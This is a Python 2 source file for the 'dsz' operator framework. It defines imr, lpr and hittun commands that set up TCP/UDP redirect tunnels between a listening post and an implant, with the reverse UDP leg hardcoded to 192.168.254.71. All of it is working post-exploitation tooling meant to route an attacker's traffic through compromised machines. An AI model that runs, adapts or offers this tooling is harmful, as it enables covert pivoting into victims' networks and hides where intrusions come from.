
import sys
import dsz.ui, dsz, dsz.version.checks.windows, re
import util.ip
import ops.networking.redirect
from ops.parseargs import ArgumentParser
from ops.pprint import pprint
import datetime

def randdirect_usage():
    print '\n    <-tcp> (group=listentype)\n        Use TCP/IP as the redirection protocol\n    <-udp> (group=listentype)\n        Use UDP/IP as the redirection protocol\n    <-lplisten [port] [bindAddr]> (group=listenLocation)\n        Listen for new connections on the LP-side (default bind=0.0.0.0).\n        NOTE: You may choose to exclude [port], which will result in a random port being used\n    <-implantlisten [port] [bindAddr]> (group=listenLocation)\n        Listen for new connections on the Implant-side (default bind=0.0.0.0).\n        NOTE: You may choose to exclude [port], which will result in a random port being used\n    [-portsharing <clientSrcPort> <clientSrcAddr>]\n    <-target <addr> [destPort] [srcAddr] [srcPort]>\n        The address / port to which data should be forwarded.\n        NOTE: Data is always forwarded to the side opposite where the listening port is.\n        NOTE: You may choose to exclude [destPort], which will result in a straight through tunnel\n    [-connections <maxConnections>]\n        Sets the maximum number of concurrent connections allowed.\n          (Default=0 / 0=Unlimited)\n    [-limitconnections <addr> <mask>]\n        Limit connections to listen address to a specified IP range.\n    [-sendnotify]\n        Send notification of target connection success / failure to\n        connecting sockets.\n    [-packetsize <bytes>]\n        Sets the maximum size (in bytes) for recv/send calls.  This is of\n        particular interest for datagram (ie, UDP) redirection (default=8192).\n    '

def imr_usage():
    print '\n    Usage: imr [target_ip] [remote_port] [dst_port]\n    Resulting command:\n        redirect -tcp -implantlisten [remote_port] -target [target_ip] [dst_port]\n\n    Usage 2: imr [target_ip] [port]\n    Resulting command:\n        redirect -tcp -implantlisten [port] -target [target_ip] [port]\n        \n    Usage 3: imr [remote_port] [dst_port]\n    Resulting command:\n        redirect -tcp -implantlisten [remote_port] -target {127.0.0.1} [dst_port]\n        \n    Usage 4: imr [target_ip]\n    Resulting command:\n        redirect -tcp -implantlisten {random_port1} -target [target_ip] {random_port1}\n        \n    Usage 5: imr [port]\n    Resulting command:\n        redirect -tcp -implantlisten [port] -target {127.0.0.1} [port]\n        \n    Usage 6: imr\n    Resulting command:\n        redirect -tcp -implantlisten {random_port1} -target {127.0.0.1} {random_port1}\n        \n    NOTE: You may put "tcp" or "udp" at any point in the options list to change the protocol\n    '

def lpr_usage():
    print '\n    Usage: lpr [target_ip] [local_port] [dst_port]\n    Resulting command:\n        redirect -tcp -lplisten [local_port] -target [target_ip] [dst_port]\n\n    Usage 2: lpr [target_ip] [port]\n    Resulting command:\n        redirect -tcp -lplisten {random_port1} -target [target_ip] [port]\n        \n    Usage 3: lpr [target_ip]\n    Resulting command:\n        redirect -tcp -lplisten {random_port1} -target [target_ip] {random_port1}\n        \n    NOTE: You may put "tcp" or "udp" at any point in the options list to change the protocol\n    '

def hittun_usage():
    print '\n    Usage: hittun [target_ip] [port]\n    Resulting commands:\n        redirect -udp -lplisten [port] -target [target_ip] [port] -packetsize 32000\n        redirect -udp -implantlisten [port] -target {192.168.254.71} [port] -packetsize 32000\n    \n    Usage 2: hittun [target_ip]\n    Resulting commands:\n        redirect -udp -lplisten {random_port1} -target [target_ip] {random_port1} -packetsize 32000\n        redirect -udp -implantlisten {random_port1} -target {192.168.254.71} {random_port1} -packetsize 32000\n    '

def get_local_addresses():
    ip_list = []
    ifconfig_obj = ops.networking.ifconfig.get_ifconfig(maxage=datetime.timedelta(seconds=(60 * 60)))
    for interfaceitem in ifconfig_obj.interfaceitem:
        for ipaddress in interfaceitem.ipaddress:
            ip_list.append(ipaddress.ip)
        for ipaddressv6 in interfaceitem.ipaddressv6:
            ip_list.append(ipaddressv6.ip.split('%')[0])
    return ip_list

def make_hittun_args(args):
    target_ip = ''
    local_port = ''
    dst_port = ''
    forward_args = ['-udp']
    reverse_args = ['-udp']
    if (len(args) > 2):
        dsz.ui.Echo('Too many arguments', dsz.ERROR)
        return False
    if (len(args) == 2):
        target_ip = args[0]
        dst_port = args[1]
        local_port = args[1]
    elif (len(args) == 1):
        target_ip = args[0]
        dst_port = ops.networking.redirect.get_random_port()
        local_port = dst_port
    else:
        return False
    if ((not (target_ip == '')) and (not util.ip.validate(target_ip))):
        dsz.ui.Echo(('%s is not a valid IP address' % target_ip), dsz.ERROR)
        return False
    if ((not (local_port == '')) and (not util.ip.validate_port(int(local_port)))):
        dsz.ui.Echo(('%s is not a valid port' % local_port), dsz.ERROR)
        return False
    if ((not (dst_port == '')) and (not util.ip.validate_port(int(dst_port)))):
        dsz.ui.Echo(('%s is not a valid port' % dst_port), dsz.ERROR)
        return False
    forward_args.append('-lplisten')
    reverse_args.append('-implantlisten')
    if (not (local_port == '')):
        forward_args.append(local_port)
        reverse_args.append(local_port)
    forward_args.append('-target')
    reverse_args.append('-target')
    if (not (target_ip == '')):
        forward_args.append(target_ip)
        reverse_args.append('192.168.254.71')
    if (not (dst_port == '')):
        forward_args.append(dst_port)
        reverse_args.append(dst_port)
    forward_args.append('-packetsize')
    forward_args.append('32000')
    reverse_args.append('-packetsize')
    reverse_args.append('32000')
    if (target_ip in get_local_addresses()):
        print '\n'
        dsz.ui.Echo(('FYI: Your specified lplisten target is your redirector (%s)' % target_ip), dsz.WARNING)
        print '\n'
    return [forward_args, reverse_args]

def make_lpr_args(args):
    target_ip = ''
    local_port = ''
    dst_port = ''
    if ('tcp' in args):
        return_args = ['-tcp']
        args.remove('tcp')
    elif ('udp' in args):
        return_args = ['-udp']
        args.remove('udp')
    else:
        return_args = ['-tcp']
    if (len(args) > 3):
        dsz.ui.Echo('Too many arguments', dsz.ERROR)
        return False
    if (len(args) == 3):
        target_ip = args[0]
        local_port = args[1]
        dst_port = args[2]
    elif (len(args) == 2):
        target_ip = args[0]
        dst_port = args[1]
    elif (len(args) == 1):
        target_ip = args[0]
    else:
        return False
    if ((not (target_ip == '')) and (not util.ip.validate(target_ip))):
        dsz.ui.Echo(('%s is not a valid IP address' % target_ip), dsz.ERROR)
        return False
    if ((not (local_port == '')) and (not util.ip.validate_port(int(local_port)))):
        dsz.ui.Echo(('%s is not a valid port' % local_port), dsz.ERROR)
        return False
    if ((not (dst_port == '')) and (not util.ip.validate_port(int(dst_port)))):
        dsz.ui.Echo(('%s is not a valid port' % dst_port), dsz.ERROR)
        return False
    return_args.append('-lplisten')
    if (not (local_port == '')):
        return_args.append(local_port)
    return_args.append('-target')
    if (not (target_ip == '')):
        return_args.append(target_ip)
    if (not (dst_port == '')):
        return_args.append(dst_port)
    if (target_ip in get_local_addresses()):
        print '\n'
        dsz.ui.Echo(('FYI: Your specified lplisten target is your redirector (%s)' % target_ip), dsz.WARNING)
        print '\n'
    return return_args

def make_imr_args(args):
    target_ip = ''
    remote_port = ''
    dst_port = ''
    if ('tcp' in args):
        return_args = ['-tcp']
        args.remove('tcp')
    elif ('udp' in args):
        return_args = ['-udp']
        args.remove('udp')
    else:
        return_args = ['-tcp']
    if (len(args) > 3):
        dsz.ui.Echo('Too many arguments', dsz.ERROR)
        return False
    if (len(args) == 3):
        target_ip = args[0]
        remote_port = args[1]
        dst_port = args[2]
        pass
    elif (len(args) == 2):
        if util.ip.validate(args[0]):
            target_ip = args[0]
            remote_port = args[1]
            dst_port = args[1]
        else:
            target_ip = '127.0.0.1'
            remote_port = args[0]
            dst_port = args[1]
        pass
    elif (len(args) == 1):
        if util.ip.validate(args[0]):
            target_ip = args[0]
        else:
            target_ip = '127.0.0.1'
            dst_port = args[0]
            remote_port = args[0]
    elif (len(args) == 0):
        target_ip = '127.0.0.1'
    if ((not (target_ip == '')) and (not util.ip.validate(target_ip))):
        dsz.ui.Echo(('%s is not a valid IP address' % target_ip), dsz.ERROR)
        return False
    if ((not (remote_port == '')) and (not util.ip.validate_port(int(remote_port)))):
        dsz.ui.Echo(('%s is not a valid port' % remote_port), dsz.ERROR)
        return False
    if ((not (dst_port == '')) and (not util.ip.validate_port(int(dst_port)))):
        dsz.ui.Echo(('%s is not a valid port' % dst_port), dsz.ERROR)
        return False
    return_args.append('-implantlisten')
    if (not (remote_port == '')):
        return_args.append(remote_port)
    return_args.append('-target')
    if (not (target_ip == '')):
        return_args.append(target_ip)
    if (not (dst_port == '')):
        return_args.append(dst_port)
    if (not (target_ip == '127.0.0.1')):
        print '\n'
        dsz.ui.Echo(('FYI: Your specified implantlisten target is not loopback, it is %s' % target_ip), dsz.WARNING)
        print '\n'
    return return_args

def print_usage(arg_zero):
    if (arg_zero == 'imr'):
        imr_usage()
    elif (arg_zero == 'lpr'):
        lpr_usage()
    elif (arg_zero == 'hittun'):
        hittun_usage()
    else:
        randdirect_usage()
    return False

def check_dumb_args(arg_list):
    fail = False
    for arg in arg_list:
        if util.ip.validate(arg):
            continue
        if (re.match('^[0123456789]*$', arg) is not None):
            if util.ip.validate_port(int(arg)):
                continue
        dsz.ui.Echo(('%s is neither an IP nor a port' % arg), dsz.ERROR)
        fail = True
    return fail

def main(args):
    if ((len(args) == 0) or (args == 0)):
        print_usage(args[0])
        return False
    arg_list = args[1:]
    tunnel_commands = []
    if (args[0] == 'imr'):
        if check_dumb_args(args[1:]):
            print_usage(args[0])
            return 0
        tunnel_commands.append(make_imr_args(args[1:]))
    elif (args[0] == 'lpr'):
        if check_dumb_args(args[1:]):
            print_usage(args[0])
            return 0
        tunnel_commands.append(make_lpr_args(args[1:]))
    elif (args[0] == 'hittun'):
        if check_dumb_args(args[1:]):
            print_usage(args[0])
            return 0
        tunnel_commands.extend(make_hittun_args(args[1:]))
    else:
        tunnel_commands.append(arg_list)
    if (arg_list == False):
        dsz.ui.Echo('Error, exiting', dsz.ERROR)
        print_usage(args[0])
        return 0
    max_attempts = 3
    success = False
    errors = []
    for arg_list in tunnel_commands:
        for i in range(0, max_attempts):
            redir_cmd = ops.networking.redirect.generate_tunnel_cmd(arg_list=arg_list, random=True)
            redir_output = ops.networking.redirect.start_tunnel(dsz_cmd=redir_cmd)
            if ((redir_output is not False) and (type(redir_output) is int)):
                dsz.ui.Echo(('Success CMDID: %s, %s' % (redir_output, str(redir_cmd))), dsz.GOOD)
                success = True
                running_tunnel = ops.networking.redirect.verify_local_tunnel(id=redir_output)
                tunnel_header = ['cmdid', 'fullcommand', 'bytessent', 'bytesreceived']
                tunnel_output = [{'cmdid': running_tunnel.id, 'fullcommand': running_tunnel.fullcommand, 'bytesreceived': running_tunnel.bytesreceived, 'bytessent': running_tunnel.bytessent}]
                pprint(tunnel_output, tunnel_header, tunnel_header)
                break
            if (type(redir_output) == type({})):
                moduleerror = ('%s: %s' % (redir_output['ModuleError']['value'], redir_output['ModuleError']['text']))
                oserror = ('%s: %s' % (redir_output['OsError']['value'], redir_output['OsError']['text']))
                errors.append({'CMDID': redir_cmd.channel, 'Command': str(redir_cmd), 'ModuleError': moduleerror, 'OsError': oserror})
    if (len(errors) > 0):
        dsz.ui.Echo('Printing errors for your information.', dsz.ERROR)
        pprint(errors, ['CMDID', 'Command', 'ModuleError', 'OsError'], ['CMDID', 'Command', 'ModuleError', 'OsError'])
    if (not success):
        dsz.ui.Echo('Failed to open three different redirect tunnels. Check your settings and re-evaluate.', dsz.WARNING)
if (__name__ == '__main__'):
    try:
        main(sys.argv[1:])
    except RuntimeError as e:
        dsz.ui.Echo(('\nCaught RuntimeError: %s' % e), dsz.ERROR)